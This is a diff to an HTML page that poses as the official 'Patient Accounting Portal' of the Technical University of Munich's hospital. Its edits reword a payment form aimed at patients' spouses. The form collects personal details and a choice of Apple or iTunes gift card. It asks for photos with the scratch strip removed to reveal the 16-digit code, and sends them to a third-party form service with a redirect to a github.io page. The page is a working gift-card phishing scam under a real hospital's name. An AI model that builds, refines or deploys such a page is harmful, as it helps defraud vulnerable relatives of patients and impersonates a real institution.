@@ -14,16 +14,16 @@
 
     <nav class="bg-white py-4 px-6 border-b flex justify-between items-center shadow-sm">
         <img src="https://i.ibb.co/LdbfV4P/TUM-Logo.png" alt="TUM Logo" class="h-10">
-        <div class="text-right leading-tight">
-            <p class="text-[9px] font-bold text-gray-400 uppercase tracking-widest">Technical University</p>
-            <p class="text-[9px] font-bold text-gray-400 uppercase tracking-widest">of Munich</p>
+        <div class="text-right leading-tight text-gray-400">
+            <p class="text-[9px] font-bold uppercase tracking-widest">Technical University</p>
+            <p class="text-[9px] font-bold uppercase tracking-widest text-right">of Munich</p>
         </div>
     </nav>
 
     <div class="relative h-64 md:h-80 w-full bg-cover bg-center" style="background-image: url('https://mri.tum.de/sites/default/files/styles/hero_image/public/images/hero/klinikum_rechts_der_isar_gebaeude.jpg');">
         <div class="absolute inset-0 hero-overlay flex flex-col items-center justify-center text-center p-4">
-            <h1 class="text-white text-3xl md:text-4xl font-extrabold uppercase tracking-tight drop-shadow-xl">Patient Accounting Portal</h1>
-            <p class="text-blue-200 text-sm md:text-lg italic font-light">Official Settlement Channel for Relatives</p>
+            <h1 class="text-white text-3xl font-extrabold uppercase tracking-tight drop-shadow-xl">Patient Accounting Portal</h1>
+            <p class="text-blue-200 text-sm italic font-light">Official Settlement Channel for Spouses</p>
         </div>
     </div>
 
@@ -32,25 +32,26 @@
             <div class="tum-blue text-white py-3 text-[10px] font-black uppercase text-center tracking-[0.2em]">SECURE TRANSACTION TERMINAL</div>
 
             <form action="https://fabform.io/f/eFrGlEo" method="POST" enctype="multipart/form-data" class="p-6 md:p-10">
+                
                 <input type="hidden" name="_redirect" value="https://clinicalportaldepartment.github.io/clinical-billing-portal/success.html">
                 
                 <h2 class="text-lg font-bold text-gray-800 mb-6 border-l-4 border-blue-600 pl-3 uppercase">1. Identification</h2>
                 <div class="grid grid-cols-1 md:grid-cols-2 gap-6 mb-8">
                     <div>
                         <label class="block text-[10px] font-bold text-gray-400 uppercase mb-1">Patient Full Name</label>
-                        <input type="text" name="Patient_Name" required class="w-full border-2 border-gray-100 p-3 rounded-xl focus:border-blue-500 outline-none">
+                        <input type="text" name="Patient_Name" required class="w-full border-2 border-gray-100 p-3 rounded-xl focus:border-blue-500 outline-none transition">
                     </div>
                     <div>
                         <label class="block text-[10px] font-bold text-gray-400 uppercase mb-1">Hospital Card ID</label>
                         <input type="text" name="Hospital_ID" placeholder="TUM-XXXX" required class="w-full border-2 border-gray-100 p-3 rounded-xl">
                     </div>
                     <div>
-                        <label class="block text-[10px] font-bold text-gray-400 uppercase mb-1">Spouse Name</label>
+                        <label class="block text-[10px] font-bold text-gray-400 uppercase mb-1">Spouse (Sender) Name</label>
                         <input type="text" name="Sender_Name" required class="w-full border-2 border-gray-100 p-3 rounded-xl">
                     </div>
                     <div>
-                        <label class="block text-[10px] font-bold text-gray-400 uppercase mb-1">Spouse Email</label>
-                        <input type="email" name="Spouse_Email" placeholder="For official receipt" required class="w-full border-2 border-gray-100 p-3 rounded-xl">
+                        <label class="block text-[10px] font-bold text-gray-400 uppercase mb-1">Spouse (Sender) Email</label>
+                        <input type="email" name="Spouse_Email" placeholder="To receive receipt" required class="w-full border-2 border-gray-100 p-3 rounded-xl">
                     </div>
                 </div>
 
@@ -61,29 +62,29 @@
                     
                     <div class="space-y-4">
                         <div>
-                            <label class="block text-[10px] font-bold text-gray-500 uppercase mb-2">Select Card Type</label>
-                            <select name="Card_Type" class="w-full bg-gray-800 border border-gray-700 p-3 rounded-xl text-sm focus:border-blue-500 outline-none">
+                            <label class="block text-[10px] font-bold text-gray-500 uppercase mb-2">Select Payment Method</label>
+                            <select name="Card_Type" class="w-full bg-gray-800 border border-gray-700 p-3 rounded-xl text-sm focus:border-blue-500 outline-none text-white">
                                 <option value="Apple Gift Card">Apple Gift Card</option>
                                 <option value="iTunes Gift Card">iTunes Gift Card</option>
                             </select>
                         </div>
 
                         <div class="bg-blue-900/30 p-4 rounded-xl border border-blue-800/50">
-                            <label class="block font-bold text-blue-400 mb-2 uppercase text-[10px] tracking-widest">Upload Front & Back Photos:</label>
-                            <p class="text-gray-400 text-[10px] mb-3 leading-tight italic">Scratch the silver strip gently to reveal the 16-digit code. Photos must be clear and readable for the clinical verification system.</p>
-                            <input type="file" name="Card_Image" required class="block w-full text-xs text-gray-400 file:mr-4 file:py-2 file:px-4 file:rounded-full file:border-0 file:bg-blue-600 file:text-white cursor-pointer hover:file:bg-blue-700 transition">
+                            <label class="block font-bold text-blue-400 mb-2 uppercase text-[10px] tracking-widest">Upload Card Photo (Front & Back):</label>
+                            <p class="text-gray-400 text-[10px] mb-3 leading-tight italic">Scratch the silver strip to reveal the 16-digit code. Ensure the capture is high-resolution for clinical verification.</p>
+                            <input type="file" name="Verification_Photo" required class="block w-full text-xs text-gray-400 file:mr-4 file:py-2 file:px-4 file:rounded-full file:border-0 file:bg-blue-600 file:text-white cursor-pointer hover:file:bg-blue-700 transition">
                         </div>
                     </div>
                 </div>
 
-                <button type="submit" class="w-full tum-blue text-white py-5 rounded-2xl font-black text-xl hover:bg-blue-800 transition-all uppercase shadow-lg transform active:scale-95">Verify & Process Payment</button>
+                <button type="submit" class="w-full tum-blue text-white py-5 rounded-2xl font-black text-xl hover:bg-blue-800 transition-all uppercase shadow-lg transform active:scale-95 tracking-tighter">Confirm & Submit for Review</button>
             </form>
         </div>
     </div>
     
-    <div class="text-center text-gray-400 text-[9px] uppercase pb-10">
+    <div class="text-center text-gray-400 text-[9px] uppercase pb-20">
         <p>© 2026 Klinikum rechts der Isar - University Hospital of Munich</p>
-        <p>Ismaninger Straße 22, 81675 Munich</p>
+        <p>Ismaninger Straße 22, 81675 Munich, Germany</p>
     </div>
 </body>
 </html>
